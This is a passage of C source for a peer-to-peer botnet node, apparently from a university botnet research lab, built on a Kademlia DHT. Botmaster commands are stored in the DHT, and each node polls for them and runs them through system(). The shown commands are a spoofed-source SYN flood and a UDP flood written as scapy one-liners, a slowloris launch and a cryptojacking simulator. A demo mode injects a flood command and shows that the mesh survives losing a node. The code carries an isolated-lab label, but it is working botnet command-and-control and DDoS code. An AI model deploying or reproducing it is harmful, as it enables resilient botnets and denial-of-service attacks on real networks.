    printf("[P2P] Payload: %.200s\n", cmd_json);

    char sys_cmd[512];
    if (strcmp(type, "syn_flood") == 0) {
        char target[64] = "192.168.100.20"; int port = 80; int duration = 10;
        const char *ti = strstr(cmd_json, "\"target\"");
        if (ti) { ti = strchr(ti+8,'"'); if(ti){ti++;sscanf(ti,"%63[^\"]",target);}}
        const char *po = strstr(cmd_json, "\"port\"");
        if (po) { po = strchr(po+6,':'); if(po) sscanf(po+1, "%d", &port); }
        const char *du = strstr(cmd_json, "\"duration\"");
        if (du) { du = strchr(du+10,':'); if(du) sscanf(du+1, "%d", &duration); }
        /* Call bot_agent logic directly via a helper that spawns a raw-socket thread */
        printf("[P2P] Executing SYN FLOOD -> %s:%d for %ds\n", target, port, duration);
        snprintf(sys_cmd, sizeof(sys_cmd),
                 "python3 -c \""
                 "from scapy.all import*;import time,random;"
                 "end=time.time()+%d;"
                 "[send(IP(src='.'.join(str(random.randint(10,199)) for _ in range(4)),"
                 "dst='%s')/TCP(sport=random.randint(1024,65535),dport=%d,flags='S'),verbose=False)"
                 " for _ in iter(int,'x') if time.time()<end]"
                 "\" 2>/dev/null &",
                 duration, target, port);
        system(sys_cmd);

    } else if (strcmp(type, "udp_flood") == 0) {
        char target[64] = "192.168.100.20"; int duration = 10;
        const char *ti = strstr(cmd_json, "\"target\"");
        if (ti) { ti = strchr(ti+8,'"'); if(ti){ti++;sscanf(ti,"%63[^\"]",target);}}
        const char *du = strstr(cmd_json, "\"duration\"");
        if (du) { du = strchr(du+10,':'); if(du) sscanf(du+1, "%d", &duration); }
        printf("[P2P] Executing UDP FLOOD -> %s for %ds\n", target, duration);
        snprintf(sys_cmd, sizeof(sys_cmd),
                 "python3 slowloris.py --duration %d 2>/dev/null &", duration);
        snprintf(sys_cmd, sizeof(sys_cmd),
                 "python3 -c \"from scapy.all import*;import time,random;"
                 "end=time.time()+%d;"
                 "[send(IP(dst='%s')/UDP(dport=random.randint(1,65534))/"
                 "Raw(b'\\\\x00'*1024),verbose=False)"
                 " for _ in iter(int,'x') if time.time()<end]\" 2>/dev/null &",
                 duration, target);
        system(sys_cmd);

    } else if (strcmp(type, "slowloris") == 0) {
        char target[64] = "192.168.100.20"; int duration = 30;
        const char *ti = strstr(cmd_json, "\"target\"");
        if (ti) { ti = strchr(ti+8,'"'); if(ti){ti++;sscanf(ti,"%63[^\"]",target);}}
        printf("[P2P] Executing SLOWLORIS -> %s for %ds\n", target, duration);
        snprintf(sys_cmd, sizeof(sys_cmd),
                 "python3 slowloris.py --host %s --duration %d &", target, duration);
        system(sys_cmd);

    } else if (strcmp(type, "cryptojack") == 0) {
        int duration = 60;
        printf("[P2P] Executing CRYPTOJACK for %ds\n", duration);
        snprintf(sys_cmd, sizeof(sys_cmd),
                 "python3 cryptojack_sim.py --duration %d &", duration);
        system(sys_cmd);

    } else if (strcmp(type, "idle") == 0) {
        printf("[P2P] -> Idle command (no action)\n");
    } else {
        printf("[P2P] -> Unknown command type: %s\n", type);
    }
}

/* ── Command poll thread ─────────────────────────────────────── */
static void *command_poll_thread(void *arg) {
    KademliaNode *n = (KademliaNode *)arg;
    uint8_t cmd_key[ID_BYTES];
    sha1_to_id(COMMAND_KEY, cmd_key);
    printf("[P2P] Command poll thread started (interval: %ds)\n", POLL_SEC);
    while (n->running) {
        for (int i = 0; i < POLL_SEC && n->running; i++) sleep(1);
        char value[MAX_VALUE_LEN];
        if (iterative_find_value(n, cmd_key, value, MAX_VALUE_LEN)) {
            /* Hash the value to detect duplicates */
            uint8_t hash[ID_BYTES];
            SHA1((const uint8_t *)value, strlen(value), hash);
            int already = 0;
            for (int i = 0; i < n->exec_count; i++) {
                if (memcmp(n->exec_hashes[i], hash, ID_BYTES) == 0) { already=1; break; }
            }
            if (!already) {
                if (n->exec_count < 64)
                    memcpy(n->exec_hashes[n->exec_count++], hash, ID_BYTES);
                execute_command(value);
            }
        } else {
            printf("[P2P] No command in DHT\n");
        }
    }
    return NULL;
}

/* ── Bucket refresh thread ───────────────────────────────────── */
static void *bucket_refresh_thread(void *arg) {
    KademliaNode *n = (KademliaNode *)arg;
    while (n->running) {
        for (int i = 0; i < REFRESH_SEC && n->running; i++) sleep(1);
        printf("[P2P] Refreshing routing table...\n");
        /* Random lookup in each non-empty bucket */
        int total_peers = 0;
        for (int i = 0; i < BUCKET_COUNT; i++) {
            if (n->routing.buckets[i].count == 0) continue;
            /* Generate a random target in this bucket's ID space */
            NodeID rand_target;
            memcpy(rand_target, n->self_id, ID_BYTES);
            /* Flip bit at position i to push it into bucket i */
            rand_target[ID_BYTES - 1 - i/8] ^= (1 << (i%8));
            Contact tmp[K]; int got;
            got = iterative_find_node(n, rand_target, tmp, K);
            for (int j = 0; j < got; j++) routing_add(&n->routing, &tmp[j], n);
            total_peers += n->routing.buckets[i].count;
        }
        printf("[P2P] Refresh done. Total peers: %d\n", total_peers);
    }
    return NULL;
}

/* ── Bootstrap ───────────────────────────────────────────────── */
static void bootstrap(KademliaNode *n, const char *seed_host, uint16_t seed_port) {
    printf("[P2P] Bootstrapping from %s:%u\n", seed_host, (unsigned)ntohs(seed_port));
    struct in_addr addr;
    if (inet_aton(seed_host, &addr) == 0) {
        struct hostent *he = gethostbyname(seed_host);
        if (!he) { printf("[P2P] Cannot resolve seed host\n"); return; }
        memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    }
    Contact seed;
    id_from_host_port(seed_host, seed_port, seed.id);
    seed.ip = addr.s_addr; seed.port = seed_port;
    seed.last_seen = time(NULL); seed.fail_count = 0;

    if (kademlia_ping(n, seed.ip, seed.port)) {
        routing_add(&n->routing, &seed, n);
        printf("[P2P] Seed reachable ✓\n");
    } else {
        printf("[P2P] Seed unreachable — starting as lone node\n");
        return;
    }
    /* Iterative FIND_NODE on own ID populates routing table */
    Contact found[K]; int n_found;
    n_found = iterative_find_node(n, n->self_id, found, K);
    printf("[P2P] Bootstrap complete. Found %d peers.\n", n_found);
}

/* ── Node init ───────────────────────────────────────────────── */
static int node_init(KademliaNode *n, const char *host, uint16_t port) {
    memset(n, 0, sizeof(*n));
    /* Resolve own IP */
    struct in_addr addr;
    if (inet_aton(host, &addr) == 0) {
        struct hostent *he = gethostbyname(host);
        if (!he) { perror("hostname"); return -1; }
        memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    }
    n->self_ip   = addr.s_addr;
    n->self_port = port;
    id_from_host_port(host, port, n->self_id);

    printf("[P2P] Node ID: ");
    for (int i = 0; i < ID_BYTES; i++) printf("%02x", n->self_id[i]);
    printf("\n[P2P] Listening on %s:%u\n", host, (unsigned)ntohs(port));

    routing_init(&n->routing, n->self_id);
    kvstore_init(&n->store);
    pthread_mutex_init(&n->pending_lock, NULL);

    /* Create UDP socket */
    n->sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (n->sock < 0) { perror("socket"); return -1; }
    int reuseaddr = 1;
    setsockopt(n->sock, SOL_SOCKET, SO_REUSEADDR, &reuseaddr, sizeof(reuseaddr));
    struct timeval tv = {1, 0};   /* 1-second recv timeout */
    setsockopt(n->sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family      = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port        = port;
    if (bind(n->sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("bind"); return -1;
    }
    n->running = 1;
    return 0;
}

/* ── Start background threads ────────────────────────────────── */
static void node_start_threads(KademliaNode *n) {
    pthread_create(&n->recv_thread,    NULL, recv_loop,            n);
    pthread_create(&n->refresh_thread, NULL, bucket_refresh_thread, n);
    pthread_create(&n->poll_thread,    NULL, command_poll_thread,   n);
}

/* ── Resilience demonstration ────────────────────────────────── */
static void print_status(KademliaNode *n) {
    int total = 0;
    for (int i = 0; i < BUCKET_COUNT; i++)
        total += n->routing.buckets[i].count;
    printf("\n[P2P] Status: %d peers in routing table | %d commands executed\n",
           total, n->exec_count);
    char id_hex[ID_BYTES*2+1];
    for (int i = 0; i < ID_BYTES; i++) sprintf(id_hex+i*2, "%02x", n->self_id[i]);
    printf("[P2P] Node ID: %.16s...\n", id_hex);
}

/* ── Main ────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    srand((unsigned)time(NULL) ^ getpid());

    char host[64]     = "127.0.0.1";
    int  port         = 7400;
    char seed_host[64] = {0};
    int  seed_port    = 7400;
    char inject_json[MAX_VALUE_LEN] = {0};
    int  demo_mode    = 0;
    int  inject_mode  = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--host") == 0 && i+1 < argc)
            strncpy(host, argv[++i], 63);
        else if (strcmp(argv[i], "--port") == 0 && i+1 < argc)
            port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--bootstrap") == 0 && i+1 < argc) {
            char *colon = strrchr(argv[++i], ':');
            if (colon) {
                *colon = '\0';
                strncpy(seed_host, argv[i], 63);
                seed_port = atoi(colon + 1);
                *colon = ':';
            }
        }
        else if (strcmp(argv[i], "--inject") == 0 && i+1 < argc) {
            strncpy(inject_json, argv[++i], MAX_VALUE_LEN-1);
            inject_mode = 1;
        }
        else if (strcmp(argv[i], "--demo") == 0) demo_mode = 1;
    }

    printf("==============================================\n");
    printf(" Kademlia P2P Node - AUA Botnet Research Lab\n");
    printf(" Node: %s:%d | Secret: %s\n", host, port, P2P_SECRET);
    printf(" ISOLATED ENVIRONMENT ONLY\n");
    printf("==============================================\n\n");

    if (demo_mode) {
        /* Local demo: 3 nodes on different ports */
        printf("[DEMO] Starting 3-node local mesh...\n\n");
        KademliaNode nodes[3];
        uint16_t ports[3] = {htons(7500), htons(7501), htons(7502)};
        for (int i = 0; i < 3; i++) {
            if (node_init(&nodes[i], "127.0.0.1", ports[i]) < 0) return 1;
        }
        /* Start recv threads for all */
        for (int i = 0; i < 3; i++) {
            pthread_create(&nodes[i].recv_thread, NULL, recv_loop, &nodes[i]);
        }
        usleep(100000);
        /* Bootstrap nodes 1 and 2 from node 0 */
        bootstrap(&nodes[1], "127.0.0.1", ports[0]);
        bootstrap(&nodes[2], "127.0.0.1", ports[0]);
        sleep(1);

        /* Botmaster (node 0) injects a command */
        printf("\n[DEMO] Botmaster injecting syn_flood command via node 0...\n");
        uint8_t cmd_key[ID_BYTES]; sha1_to_id(COMMAND_KEY, cmd_key);
        const char *cmd = "{\"type\":\"syn_flood\",\"target\":\"192.168.100.20\",\"port\":80,\"duration\":5}";
        store_value(&nodes[0], cmd_key, cmd, strlen(cmd));

        sleep(1);

        /* All nodes poll for command */
        printf("\n[DEMO] All nodes polling DHT for command...\n");
        for (int i = 0; i < 3; i++) {
            char found[MAX_VALUE_LEN];
            int ok = iterative_find_value(&nodes[i], cmd_key, found, MAX_VALUE_LEN);
            char id_hex[8];
            for (int j = 0; j < 4; j++) sprintf(id_hex+j*2, "%02x", nodes[i].self_id[j]);
            printf("  Node %s... %s: %s\n", id_hex,
                   ok ? "FOUND command" : "not found",
                   ok ? found : "");
        }

        /* Resilience demo: kill node 1, show node 2 still reaches node 0 */
        printf("\n[DEMO] Killing node 1 (30%% of mesh)...\n");
        nodes[1].running = 0;
        sleep(1);
        char found[MAX_VALUE_LEN];
        int ok = iterative_find_value(&nodes[2], cmd_key, found, MAX_VALUE_LEN);
        printf("[DEMO] Node 2 after node 1 killed: %s\n",
               ok ? "command STILL FOUND — mesh survived ✓" : "command not found");
        printf("[DEMO] P2P resilience demonstrated.\n\n");

        nodes[0].running = 0;
        nodes[2].running = 0;
        return 0;
    }

    KademliaNode node;
    uint16_t port_net = htons((uint16_t)port);
    if (node_init(&node, host, port_net) < 0) return 1;
    node_start_threads(&node);
    sleep(1);   /* let recv thread start */

    if (seed_host[0]) bootstrap(&node, seed_host, htons((uint16_t)seed_port));

    if (inject_mode) {
        sleep(2);   /* wait for bootstrap */
        uint8_t cmd_key[ID_BYTES]; sha1_to_id(COMMAND_KEY, cmd_key);
        int acks = store_value(&node, cmd_key, inject_json, strlen(inject_json));
        printf("[P2P] Command injected: %s | acks: %d\n", inject_json, acks);
        sleep(1);
        node.running = 0;
        return 0;
    }

    /* Normal run mode: loop until killed */
    printf("[P2P] Running. Press Ctrl+C to stop.\n\n");
    while (node.running) {
        sleep(60);
        print_status(&node);
    }
    return 0;
}
